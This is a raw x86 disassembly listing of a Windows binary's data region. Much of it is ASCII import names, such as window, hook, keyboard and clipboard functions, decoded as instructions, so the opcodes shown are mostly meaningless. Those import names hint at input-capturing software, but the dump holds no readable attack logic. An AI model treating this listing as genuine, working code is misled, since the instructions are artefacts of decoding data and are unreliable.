  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fst    QWORD PTR [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
